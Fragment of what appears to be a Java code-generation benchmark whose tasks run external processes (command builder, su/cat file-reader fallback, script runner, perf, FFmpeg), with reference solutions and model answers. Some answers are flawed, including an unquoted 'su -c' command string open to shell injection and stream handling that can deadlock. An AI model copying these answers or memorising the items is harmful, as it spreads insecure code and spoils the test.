    "right_result": "```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.Objects;\nimport java.util.function.Consumer;\n\npublic class RandomAccessReadMemoryMappedFile {\n    private final MappedByteBuffer mappedByteBuffer;\n    private final long size;\n    private final FileChannel fileChannel;\n    private final Consumer<? super ByteBuffer> unmapper;\n\n    public RandomAccessReadMemoryMappedFile(String filename) throws IOException {\n        this(new File(filename));\n    }\n\n    public RandomAccessReadMemoryMappedFile(File file) throws IOException {\n        this(file.toPath());\n    }\n\n    public RandomAccessReadMemoryMappedFile(Path path) throws IOException {\n        this.fileChannel = FileChannel.open(path);\n        this.size = fileChannel.size();\n        this.mappedByteBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, size);\n        this.unmapper = createUnmapper(mappedByteBuffer);\n    }\n\n    private static Consumer<ByteBuffer> createUnmapper(ByteBuffer buffer) {\n        try {\n            var cleanerMethod = buffer.getClass().getMethod(\"cleaner\");\n            cleanerMethod.setAccessible(true);\n            var invoke = cleanerMethod.invoke(buffer);\n            var cleanerInterface = Class.forName(\"sun.misc.Cleaner\");\n            var cleanMethod = cleanerInterface.getMethod(\"clean\");\n            return (Consumer<ByteBuffer>) obj -> {\n                try {\n                    cleanMethod.invoke(invoke);\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }\n            };\n        } catch (Exception e) {\n            return b -> {\n                // Fallback if unmapping is not possible\n            };\n        }\n    }\n\n    public void close() throws IOException {\n        try {\n            unmapper.accept(mappedByteBuffer);\n        } finally {\n            if (fileChannel.isOpen()) {\n                fileChannel.close();\n            }\n        }\n    }\n\n    public void seek(long position) {\n        checkClosed();\n        if (position < 0 || position > size) {\n            throw new IllegalArgumentException(\"Position out of bounds: \" + position);\n        }\n        mappedByteBuffer.position((int) position);\n    }\n\n    public long getPosition() {\n        checkClosed();\n        return mappedByteBuffer.position();\n    }\n\n    public int read() {\n        checkClosed();\n        if (isEOF()) {\n            return -1;\n        }\n        return mappedByteBuffer.get() & 0xFF;\n    }\n\n    public int read(byte[] b, int offset, int length) {\n        checkClosed();\n        if (b == null) {\n            throw new NullPointerException();\n        } else if (offset < 0 || length < 0 || offset + length > b.length) {\n            throw new IndexOutOfBoundsException();\n        } else if (length == 0) {\n            return 0;\n        }\n\n        if (isEOF()) {\n            return -1;\n        }\n\n        int remaining = (int) Math.min(length, size - mappedByteBuffer.position());\n        mappedByteBuffer.get(b, offset, remaining);\n        return remaining;\n    }\n\n    public long length() {\n        return size;\n    }\n\n    public boolean isClosed() {\n        return !fileChannel.isOpen();\n    }\n\n    public boolean isEOF() {\n        return mappedByteBuffer.position() >= size;\n    }\n\n    private void checkClosed() {\n        if (isClosed()) {\n            throw new IllegalStateException(\"Reader is closed\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 270,
    "Instruction": "Task Description: Create a Java class that provides a fluent interface for building and executing command-line processes with configurable environment variables, working directory, and output handling.\n\nClass Description: The CommandLine class is a builder-style utility for executing external processes. It allows chaining configuration methods to set up command arguments, environment variables, working directory, and output streams before execution. The class handles process execution, stream management, and result collection.\n\nAttributes:\n- cmdLine: List<String> - Stores the command and its arguments\n- env: Map<String, String> - Stores environment variables for the process\n- cleanEnvironment: boolean - Flag to determine whether to clear existing environment variables\n- workingDirectory: File - The working directory for the process\n- outPrefix: String - Prefix for standard output lines\n- errPrefix: String - Prefix for error output lines\n- out: OutputStream - Stream for standard output\n- err: OutputStream - Stream for error output\n\nMethods:\n- cmd(String): CommandLine - Static factory method to create a new CommandLine instance with initial command\n- workingDirectory(File): CommandLine - Sets the working directory using File object\n- workingDirectory(String): CommandLine - Sets the working directory using path string\n- arg(String): CommandLine - Adds a single argument to the command\n- args(String...): CommandLine - Adds multiple arguments to the command\n- outPrefix(String): CommandLine - Sets prefix for standard output\n- errPrefix(String): CommandLine - Sets prefix for error output\n- out(OutputStream): CommandLine - Sets standard output stream\n- err(OutputStream): CommandLine - Sets error output stream\n- env(String, String): CommandLine - Adds an environment variable\n- newEnv(boolean): CommandLine - Configures whether to clean environment variables\n- run(): ProcessRunner.ProcessResult - Executes the configured command and returns the result",
    "Canonical_solution": "import jodd.io.StreamGobbler;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class CommandLine {\n\n    public static final int OK = 0;\n\n    protected final List<String> cmdLine = new ArrayList<>();\n    protected Map<String, String> env = null;\n    protected boolean cleanEnvironment = false;\n    protected File workingDirectory;\n    protected String outPrefix;\n    protected String errPrefix;\n    protected OutputStream out = System.out;\n    protected OutputStream err = System.err;\n\n    protected CommandLine(final String command) {\n        cmdLine.add(command);\n    }\n\n    public static CommandLine cmd(final String command) {\n        return new CommandLine(command);\n    }\n\n    public CommandLine workingDirectory(final File workDirectory) {\n        this.workingDirectory = workDirectory;\n        return this;\n    }\n\n    public CommandLine workingDirectory(final String workDirectory) {\n        this.workingDirectory = new File(workDirectory);\n        return this;\n    }\n\n    public CommandLine arg(final String argument) {\n        cmdLine.add(argument);\n        return this;\n    }\n\n    public CommandLine args(final String... arguments) {\n        if (arguments != null && arguments.length > 0) {\n            Collections.addAll(cmdLine, arguments);\n        }\n        return this;\n    }\n\n    public CommandLine outPrefix(final String prefix) {\n        this.outPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine errPrefix(final String prefix) {\n        this.errPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine out(final OutputStream out) {\n        this.out = out;\n        return this;\n    }\n\n    public CommandLine err(final OutputStream err) {\n        this.err = err;\n        return this;\n    }\n\n    public CommandLine env(final String key, final String value) {\n        if (env == null) {\n            env = new HashMap<>();\n        }\n        env.put(key, value);\n        return this;\n    }\n\n    public CommandLine newEnv(final boolean clean) {\n        cleanEnvironment = clean;\n        return this;\n    }\n\n    public ProcessRunner.ProcessResult run() {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        out = err = baos;\n\n        try {\n            baos.write(StringUtil.join(cmdLine, ' ').getBytes());\n            baos.write(StringPool.BYTES_NEW_LINE);\n        }\n        catch (IOException ignore) {\n        }\n\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        processBuilder.command(cmdLine);\n\n        if (cleanEnvironment) {\n            processBuilder.environment().clear();\n        }\n        if (env != null) {\n            processBuilder.environment().putAll(env);\n        }\n\n        processBuilder.directory(workingDirectory);\n\n        Process process = null;\n        try {\n            process = processBuilder.start();\n        }\n        catch (IOException ioex) {\n            return writeException(baos, ioex);\n        }\n\n        StreamGobbler outputGobbler = new StreamGobbler(process.getInputStream(), out, outPrefix);\n        StreamGobbler errorGobbler = new StreamGobbler(process.getErrorStream(), err, errPrefix);\n\n        outputGobbler.start();\n        errorGobbler.start();\n\n        int result;\n        try {\n            result = process.waitFor();\n        }\n        catch (InterruptedException iex) {\n            return writeException(baos, iex);\n        }\n\n        outputGobbler.waitFor();\n        errorGobbler.waitFor();\n\n        return new ProcessRunner.ProcessResult(result, baos.toString());\n    }\n\n    private ProcessRunner.ProcessResult writeException(final ByteArrayOutputStream baos, final Exception ex) {\n        try {\n            baos.write(errPrefix.getBytes());\n        }\n        catch (IOException ignore) {\n        }\n\n        ex.printStackTrace(new PrintStream(baos));\n        return new ProcessRunner.ProcessResult(-1, baos.toString());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.util.*;\n\npublic class CommandLine {\n    private final List<String> cmdLine = new ArrayList<>();\n    private final Map<String, String> env = new HashMap<>();\n    private boolean cleanEnvironment;\n    private File workingDirectory;\n    private String outPrefix;\n    private String errPrefix;\n    private OutputStream out;\n    private OutputStream err;\n\n    private CommandLine(String command) {\n        this.cmdLine.add(command);\n    }\n\n    public static CommandLine cmd(String command) {\n        return new CommandLine(command);\n    }\n\n    public CommandLine workingDirectory(File dir) {\n        this.workingDirectory = dir;\n        return this;\n    }\n\n    public CommandLine workingDirectory(String path) {\n        this.workingDirectory = new File(path);\n        return this;\n    }\n\n    public CommandLine arg(String arg) {\n        this.cmdLine.add(arg);\n        return this;\n    }\n\n    public CommandLine args(String... args) {\n        Collections.addAll(this.cmdLine, args);\n        return this;\n    }\n\n    public CommandLine outPrefix(String prefix) {\n        this.outPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine errPrefix(String prefix) {\n        this.errPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine out(OutputStream outputStream) {\n        this.out = outputStream;\n        return this;\n    }\n\n    public CommandLine err(OutputStream outputStream) {\n        this.err = outputStream;\n        return this;\n    }\n\n    public CommandLine env(String key, String value) {\n        this.env.put(key, value);\n        return this;\n    }\n\n    public CommandLine newEnv(boolean clean) {\n        this.cleanEnvironment = clean;\n        return this;\n    }\n\n    public ProcessRunner.ProcessResult run() throws IOException, InterruptedException {\n        ProcessBuilder builder = new ProcessBuilder(cmdLine);\n        if (cleanEnvironment) {\n            builder.environment().clear();\n        }\n        for (Map.Entry<String, String> entry : env.entrySet()) {\n            builder.environment().put(entry.getKey(), entry.getValue());\n        }\n        if (workingDirectory != null) {\n            builder.directory(workingDirectory);\n        }\n\n        Process process = builder.start();\n\n        Thread stdoutThread = createStreamHandler(\n                process.getInputStream(),\n                out == null ? System.out : out,\n                outPrefix\n        );\n        Thread stderrThread = createStreamHandler(\n                process.getErrorStream(),\n                err == null ? System.err : err,\n                errPrefix\n        );\n\n        stdoutThread.start();\n        stderrThread.start();\n\n        int exitCode = process.waitFor();\n        stdoutThread.join();\n        stderrThread.join();\n\n        return new ProcessRunner.ProcessResult(exitCode);\n    }\n\n    private Thread createStreamHandler(InputStream inputStream, OutputStream outputStream, String prefix) {\n        return new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n                 BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    if (prefix != null && !prefix.isEmpty()) {\n                        writer.write(prefix);\n                        writer.newLine();\n                    }\n                    writer.write(line);\n                    writer.newLine();\n                }\n                writer.flush();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public static class ProcessResult {\n        private final int exitCode;\n\n        public ProcessResult(int exitCode) {\n            this.exitCode = exitCode;\n        }\n\n        public int getExitCode() {\n            return exitCode;\n        }\n\n        public boolean success() {\n            return exitCode == 0;\n        }\n    }\n\n    public static class ProcessRunner {\n        public static ProcessResult execute(CommandLine commandLine) throws IOException, InterruptedException {\n            return commandLine.run();\n        }\n\n        public static class ProcessResult {\n            private final int exitCode;\n\n            public ProcessResult(int exitCode) {\n                this.exitCode = exitCode;\n            }\n\n            public int getExitCode() {\n                return exitCode;\n            }\n\n            public boolean success() {\n                return exitCode == 0;\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 273,
    "Instruction": "Task Description: Create a Java class that extends the Reader abstract class to read files, with fallback to using system commands when direct file access fails (e.g., when running with restricted permissions).\n\nClass Description: FileReader is a Reader implementation that first attempts to read files directly, and if that fails (due to permission issues), it falls back to executing system commands (via su and cat/toolbox cat) to read the file contents. The class handles process creation, stream management, and proper cleanup.\n\nAttributes:\nmStream: InputStreamReader - The underlying input stream used for reading file contents, either from direct file access or process output\n\nMethods:\nFileReader: [Constructor](Shell shell, String file) -> [void] - Initializes the reader by attempting direct file access first, falling back to process-based reading if needed. Throws FileNotFoundException if neither method succeeds.\n- shell: Shell - Optional shell helper object to locate system commands\n- file: String - Path to the file to be read\n\nclose: close() -> [void] - Closes the underlying input stream. Throws IOException if the stream cannot be closed.\n\nread: read(char[] buffer, int offset, int count) -> [int] - Reads characters into a portion of an array from the underlying stream. Returns the number of characters read or -1 if end of stream is reached.\n- buffer: char[] - Destination buffer\n- offset: int - Offset at which to start storing characters\n- count: int - Maximum number of characters to read",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.nio.CharBuffer;\n\npublic class FileReader extends Reader {\n    protected InputStreamReader mStream;\n\n    public FileReader(Shell shell, String file) throws FileNotFoundException {\n        String filePath = new File(file).getAbsolutePath();\n\n        try {\n            mStream = new InputStreamReader(new FileInputStream(filePath));\n\n        } catch (FileNotFoundException e) {\n            String binary = shell != null ? shell.findCommand(\"cat\") : \"toolbox cat\";\n\n            try {\n                ProcessBuilder builder = new ProcessBuilder(\"su\");\n                builder.redirectErrorStream(true);\n\n                Process process = builder.start();\n                mStream = new InputStreamReader(process.getInputStream());\n\n                DataOutputStream stdIn = new DataOutputStream(process.getOutputStream());\n                stdIn.write( (binary + \" '\" + filePath + \"'\\n\").getBytes() );\n                stdIn.write( (\"exit $?\\n\").getBytes() );\n                stdIn.flush();\n                stdIn.close();\n\n                Integer resultCode = process.waitFor();\n\n                if (!resultCode.equals(0)) {\n                    throw new FileNotFoundException(e.getMessage());\n                }\n\n            } catch (Throwable te) {\n                throw new FileNotFoundException(te.getMessage());\n            }\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        mStream.close();\n    }\n\n    @Override\n    public int read(char[] buffer, int offset, int count) throws IOException {\n        return mStream.read(buffer, offset, count);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.util.concurrent.TimeUnit;\n\npublic class FileReader extends Reader {\n    private final InputStreamReader mStream;\n\n    public FileReader(Shell shell, String file) throws FileNotFoundException {\n        File f = new File(file);\n        try {\n            if (f.exists() && f.canRead()) {\n                mStream = new InputStreamReader(new FileInputStream(f));\n                return;\n            }\n        } catch (SecurityException | IOException ignored) {\n        }\n\n        ProcessBuilder pb = new ProcessBuilder(\"su\", \"-c\", \"toolbox cat \" + file);\n        if (shell != null) {\n            try {\n                String whichCat = shell.execCommand(\"which cat\").getOutput();\n                if (!whichCat.isEmpty()) {\n                    pb.command(\"su\", \"-c\", whichCat + \" \" + file);\n                }\n            } catch (IOException | InterruptedException e) {\n            }\n        }\n\n        try {\n            Process process = pb.start();\n            InputStream inputStream = process.getInputStream();\n            mStream = new InputStreamReader(inputStream);\n\n            if (!process.waitFor(5, TimeUnit.SECONDS)) {\n                process.destroy();\n                throw new FileNotFoundException(\"Failed to read file via fallback method\");\n            }\n\n            int exitCode = process.exitValue();\n            if (exitCode != 0) {\n                throw new FileNotFoundException(\"File access failed with exit code: \" + exitCode);\n            }\n        } catch (IOException | InterruptedException e) {\n            throw new FileNotFoundException(\"Fallback reading failed: \" + e.getMessage());\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        mStream.close();\n    }\n\n    @Override\n    public int read(char[] buffer, int offset, int count) throws IOException {\n        return mStream.read(buffer, offset, count);\n    }\n}\n```"
  },
  {
    "Task_id": 276,
    "Instruction": "Task Description: Create a Java abstract class that provides functionality for executing external scripts in a cross-platform manner, handling both input and error streams concurrently, and logging the results.\n\nClass Description: AbstractScriptProcessor is an abstract base class designed to execute external scripts (shell scripts for Unix-like systems or batch files for Windows) while properly handling process streams and logging. It uses ProcessBuilder for process creation and ForkJoinPool for concurrent stream handling.\n\nAttributes:\n- POOL: [ForkJoinPool] - A shared thread pool for concurrent stream processing\n- SH_SHELL: [String] - Constant for Unix shell path (/bin/sh)\n- CMD_SHELL: [String] - Constant for Windows command processor (cmd.exe)\n\nMethods:\n- executeScript: [TaskContext context, String scriptPath] -> [ProcessResult] - Executes the specified script file, handles platform compatibility checks, manages process streams, and returns execution results\n- copyStream: [InputStream is, StringBuilder sb, OmsLogger omsLogger, Charset charset] -> [void] - Helper method to copy stream contents to a StringBuilder while logging\n- getRunCommand: [] -> [String] - Abstract method to be implemented by subclasses to return the appropriate shell command\n- getCharset: [] -> [Charset] - Returns the charset to use for stream processing (defaults to UTF-8)",
    "Canonical_solution": "import tech.powerjob.worker.core.processor.ProcessResult;\nimport tech.powerjob.worker.core.processor.TaskContext;\nimport tech.powerjob.worker.log.OmsLogger;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.SystemUtils;\nimport java.io.*;\nimport java.nio.charset.Charset;\nimport java.nio.file.Files;\nimport java.util.concurrent.ForkJoinPool;\nimport java.util.concurrent.ForkJoinTask;\n\npublic abstract class AbstractScriptProcessor {\n\n    private static final ForkJoinPool POOL = new ForkJoinPool(4 * Runtime.getRuntime().availableProcessors());\n    protected static final String SH_SHELL = \"/bin/sh\";\n    protected static final String CMD_SHELL = \"cmd.exe\";\n\n    protected ProcessResult executeScript(TaskContext context, String scriptPath) throws Exception {\n        OmsLogger omsLogger = context.getOmsLogger();\n        \n        if (SystemUtils.IS_OS_WINDOWS && StringUtils.equals(getRunCommand(), SH_SHELL)) {\n            String message = String.format(\"[SYSTEM] Current OS is %s where shell scripts cannot run.\", SystemUtils.OS_NAME);\n            omsLogger.warn(message);\n            return new ProcessResult(false, message);\n        }\n\n        ProcessBuilder pb = StringUtils.equals(getRunCommand(), CMD_SHELL) ?\n                new ProcessBuilder(getRunCommand(), \"/c\", scriptPath)\n                : new ProcessBuilder(getRunCommand(), scriptPath);\n        Process process = pb.start();\n\n        StringBuilder inputBuilder = new StringBuilder();\n        StringBuilder errorBuilder = new StringBuilder();\n\n        boolean success = true;\n        String result;\n\n        final Charset charset = getCharset();\n        try {\n            InputStream is = process.getInputStream();\n            InputStream es = process.getErrorStream();\n\n            ForkJoinTask<?> inputSubmit = POOL.submit(() -> copyStream(is, inputBuilder, omsLogger, charset));\n            ForkJoinTask<?> errorSubmit = POOL.submit(() -> copyStream(es, errorBuilder, omsLogger, charset));\n\n            success = process.waitFor() == 0;\n\n            inputSubmit.get();\n            errorSubmit.get();\n\n        } catch (InterruptedException ie) {\n            omsLogger.info(\"[SYSTEM] ScriptProcessor has been interrupted\");\n        } finally {\n            result = String.format(\"[INPUT]: %s;[ERROR]: %s\", inputBuilder, errorBuilder);\n        }\n        return new ProcessResult(success, result);\n    }\n\n    private void copyStream(InputStream is, StringBuilder sb, OmsLogger omsLogger, Charset charset) {\n        String line;\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(is, charset))) {\n            while ((line = br.readLine()) != null) {\n                sb.append(line).append(System.lineSeparator());\n                omsLogger.info(line);\n            }\n        } catch (Exception e) {\n            omsLogger.warn(\"[SYSTEM] copyStream failed.\", e);\n            sb.append(\"Exception: \").append(e);\n        } finally {\n            try {\n                is.close();\n            } catch (IOException e) {\n                omsLogger.warn(\"[SYSTEM] close stream failed.\", e);\n            }\n        }\n    }\n\n    protected abstract String getRunCommand();\n\n    protected Charset getCharset() {\n        return StandardCharsets.UTF_8;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.nio.charset.Charset;\nimport java.util.concurrent.*;\nimport java.util.logging.Logger;\n\npublic abstract class AbstractScriptProcessor {\n    protected static final ForkJoinPool POOL = new ForkJoinPool();\n    protected static final String SH_SHELL = \"/bin/sh\";\n    protected static final String CMD_SHELL = \"cmd.exe\";\n\n    public ProcessResult executeScript(TaskContext context, String scriptPath) throws IOException {\n        if (scriptPath == null || scriptPath.isEmpty()) {\n            throw new IllegalArgumentException(\"Script path cannot be null or empty\");\n        }\n\n        ProcessBuilder processBuilder = new ProcessBuilder(getRunCommand(), scriptPath);\n        processBuilder.redirectErrorStream(false);\n\n        Process process = processBuilder.start();\n\n        StringBuilder stdout = new StringBuilder();\n        StringBuilder stderr = new StringBuilder();\n\n        Charset charset = getCharset();\n\n        OmsLogger omsLogger = context.getLogger();\n\n        try {\n            POOL.submit(() -> copyStream(process.getInputStream(), stdout, omsLogger, charset)).get();\n            POOL.submit(() -> copyStream(process.getErrorStream(), stderr, omsLogger, charset)).get();\n        } catch (InterruptedException | ExecutionException e) {\n            Thread.currentThread().interrupt();\n            return new ProcessResult(1, stdout.toString(), stderr.toString());\n        }\n\n        int exitCode;\n        try {\n            exitCode = process.waitFor();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            return new ProcessResult(1, stdout.toString(), stderr.toString());\n        }\n\n        return new ProcessResult(exitCode, stdout.toString(), stderr.toString());\n    }\n\n    private void copyStream(InputStream is, StringBuilder sb, OmsLogger omsLogger, Charset charset) {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(is, charset))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n                omsLogger.log(line);\n            }\n        } catch (IOException e) {\n            omsLogger.log(\"Error reading stream: \" + e.getMessage());\n        }\n    }\n\n    protected abstract String getRunCommand();\n\n    protected Charset getCharset() {\n        return Charset.forName(\"UTF-8\");\n    }\n\n    public static class ProcessResult {\n        private final int exitCode;\n        private final String stdout;\n        private final String stderr;\n\n        public ProcessResult(int exitCode, String stdout, String stderr) {\n            this.exitCode = exitCode;\n            this.stdout = stdout;\n            this.stderr = stderr;\n        }\n\n        public int getExitCode() {\n            return exitCode;\n        }\n\n        public String getStdout() {\n            return stdout;\n        }\n\n        public String getStderr() {\n            return stderr;\n        }\n    }\n\n    public interface TaskContext {\n        OmsLogger getLogger();\n    }\n\n    public interface OmsLogger {\n        void log(String message);\n    }\n}\n```"
  },
  {
    "Task_id": 277,
    "Instruction": "Task Description: The task involves creating a Java class that utilizes ProcessBuilder to execute external processes, specifically for performance monitoring and data collection using the 'perf' tool. The class should handle process execution, stream management, and synchronization.\n\nClass Description: This class is designed to interact with the Linux 'perf' performance monitoring tool. It provides functionality to parse performance events and add JVM invocation options for performance recording. The class manages process execution, handles input/output streams, and ensures proper synchronization.\n\nAttributes:\n- sampleFrequency: [String] - The sampling frequency for performance recording\n- optFrequency: [OptionSpec<String>] - Configuration option for frequency setting\n- perfBinData: [File] - File object storing binary performance data (implied from context)\n- perfParsedData: [File] - File object for storing parsed performance data (implied from context)\n- requestedEventNames: [Collection<String>] - Collection of performance event names to monitor (implied from context)\n\nMethods:\n- parseEvents() -> [void] - Executes the 'perf script' command to parse binary performance data, redirects process output streams to a file, and waits for process completion\n- addJVMInvokeOptions(BenchmarkParams params) -> [Collection<String>] - Generates command-line options for 'perf record' with specified sampling frequency and events\n- InputStreamDrainer(InputStream, OutputStream) -> [void] - Helper class/thread for draining process streams (implied from context)",
    "Canonical_solution": "import java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.Arrays;\nimport java.util.Collection;\nimport org.openjdk.jmh.infra.BenchmarkParams;\nimport org.openjdk.jmh.util.Utils;\n\nprivate String sampleFrequency;\nprivate OptionSpec<String> optFrequency;\n\n@Override\nprotected void parseEvents() {\n    try (FileOutputStream fos = new FileOutputStream(perfParsedData.file())) {\n        ProcessBuilder pb = new ProcessBuilder(PerfSupport.PERF_EXEC, \"script\", \"--fields\", \"time,event,ip,sym,dso\", \"--input\", perfBinData.getAbsolutePath());\n        Process p = pb.start();\n\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), fos);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), fos);\n\n        errDrainer.start();\n        outDrainer.start();\n\n        p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n    } catch (IOException | InterruptedException ex) {\n        throw new IllegalStateException(ex);\n    }\n}\n\n@Override\npublic Collection<String> addJVMInvokeOptions(BenchmarkParams params) {\n    return Arrays.asList(PerfSupport.PERF_EXEC, \"record\", \"--freq\", String.valueOf(sampleFrequency), \"--event\", Utils.join(requestedEventNames, \",\"), \"--output\", perfBinData.getAbsolutePath());\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.util.*;\n\npublic class PerfMonitor {\n    private String sampleFrequency;\n    private File perfBinData = new File(\"perf.data\");\n    private File perfParsedData = new File(\"perf_parsed.txt\");\n    private Collection<String> requestedEventNames;\n\n    public void parseEvents() throws IOException, InterruptedException {\n        List<String> command = new ArrayList<>();\n        command.add(\"perf\");\n        command.add(\"script\");\n        command.add(\"-i\");\n        command.add(perfBinData.getAbsolutePath());\n        command.add(\"--output\");\n        command.add(perfParsedData.getAbsolutePath());\n\n        ProcessBuilder processBuilder = new ProcessBuilder(command);\n        Process process = processBuilder.start();\n\n        Thread inputDrain = new InputStreamDrainer(process.getInputStream(), System.out);\n        Thread errorDrain = new InputStreamDrainer(process.getErrorStream(), System.err);\n\n        inputDrain.start();\n        errorDrain.start();\n\n        int exitCode = process.waitFor();\n        inputDrain.join();\n        errorDrain.join();\n\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Failed to parse performance data. Exit code: \" + exitCode);\n        }\n    }\n\n    public Collection<String> addJVMInvokeOptions(BenchmarkParams params) {\n        List<String> options = new ArrayList<>();\n        options.add(\"record\");\n        options.add(\"-F\");\n        options.add(sampleFrequency);\n        options.add(\"-o\");\n        options.add(perfBinData.getAbsolutePath());\n\n        for (String event : requestedEventNames) {\n            options.add(\"-e\");\n            options.add(event);\n        }\n\n        return options;\n    }\n\n    static class InputStreamDrainer extends Thread {\n        private final InputStream inputStream;\n        private final OutputStream outputStream;\n\n        public InputStreamDrainer(InputStream inputStream, OutputStream outputStream) {\n            this.inputStream = inputStream;\n            this.outputStream = outputStream;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    outputStream.write(buffer, 0, bytesRead);\n                    outputStream.flush();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 278,
    "Instruction": "Task Description: Create a Java function that executes an FFmpeg process to convert a video file into NUT format with raw video and audio codecs, then reads and processes the output using a NutReader.\n\nFunction Description: The function testNutReader() configures and executes an FFmpeg process to convert an input video file into NUT format with specific codec settings (rawvideo for video, pcm_s32le for audio). It then reads and processes the output stream using a NutReader with custom handlers for stream and frame events. The function ensures proper process synchronization by waiting for the FFmpeg process to complete.\n\nInput: None (uses a predefined input file Samples.big_buck_bunny_720p_1mb)\n\nOutput: None (void return type), but the function:\n1. Executes an FFmpeg conversion process\n2. Processes the output through NutReader callbacks\n3. Asserts the process completed successfully (exit code 0)\n\nExceptions:\n- InterruptedException: If the thread is interrupted while waiting for the process\n- ExecutionException: If there's an error in process execution\n- IOException: If there's an I/O error during process handling\n- LineUnavailableException: If there's an audio line availability issue",
    "Canonical_solution": "import java.io.IOException;\nimport java.util.List;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport javax.sound.sampled.LineUnavailableException;\n\npublic void testNutReader()\n    throws InterruptedException, ExecutionException, IOException, LineUnavailableException {\n\n    List<String> args =\n        new FFmpegBuilder()\n            .setInput(Samples.big_buck_bunny_720p_1mb)\n            .done()\n            .addStdoutOutput()\n            .setFormat(\"nut\")\n            .setVideoCodec(\"rawvideo\")\n            .setVideoPixelFormat(\"argb\")\n            .setAudioCodec(\"pcm_s32le\")\n            .done()\n            .build();\n\n    List<String> newArgs =\n        ImmutableList.<String>builder().add(FFmpeg.DEFAULT_PATH).addAll(args).build();\n\n    ProcessBuilder builder = new ProcessBuilder(newArgs);\n    Process p = builder.start();\n\n    new NutReader(\n            p.getInputStream(),\n            new NutReaderListener() {\n                @Override\n                public void stream(Stream stream) {\n                    // Audio stream handling logic\n                }\n\n                @Override\n                public void frame(Frame frame) {\n                    // Frame processing logic\n                }\n            })\n        .read();\n\n    assertEquals(0, p.waitFor());\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport javax.sound.sampled.LineUnavailableException;\n\npublic class NutReaderTest {\n\n    public void testNutReader() throws IOException, InterruptedException, ExecutionException, LineUnavailableException {\n        ProcessBuilder processBuilder = new ProcessBuilder(\n                \"ffmpeg\",\n                \"-i\", \"Samples/big_buck_bunny_720p_1mb.mp4\",\n                \"-c:v\", \"rawvideo\",\n                \"-c:a\", \"pcm_s32le\",\n                \"-f\", \"nut\",\n                \"-\"\n        );\n        processBuilder.redirectErrorStream(true);\n        Process ffmpegProcess = processBuilder.start();\n\n        NutReader nutReader = new NutReader();\n        nutReader.setStreamHandler((streamInfo) -> {\n            System.out.println(\"Stream: \" + streamInfo);\n        });\n        nutReader.setFrameHandler((packet) -> {\n            System.out.println(\"Received packet with size: \" + packet.size());\n        });\n\n        nutReader.readFrom(ffmpegProcess.getInputStream());\n\n        int exitCode = ffmpegProcess.waitFor();\n        if (exitCode != 0) {\n            throw new ExecutionException(\"FFmpeg process exited with code: \" + exitCode);\n        }\n    }\n\n    static class NutReader {\n        private InputStream inputStream;\n        private Consumer<StreamInfo> streamHandler;\n        private Consumer<Packet> frameHandler;\n\n        public void setStreamHandler(Consumer<StreamInfo> handler) {\n            this.streamHandler = handler;\n        }\n\n        public void setFrameHandler(Consumer<Packet> handler) {\n            this.frameHandler = handler;\n        }\n\n        public void readFrom(InputStream inputStream) throws IOException {\n            this.inputStream = inputStream;\n            // Dummy implementation to simulate reading and processing packets\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                if (frameHandler != null) {\n                    frameHandler.accept(new Packet(buffer, bytesRead));\n                }\n            }\n        }\n    }\n\n    static class StreamInfo {\n        @Override\n        public String toString() {\n            return \"Sample Stream Info\";\n        }\n    }\n\n    static class Packet 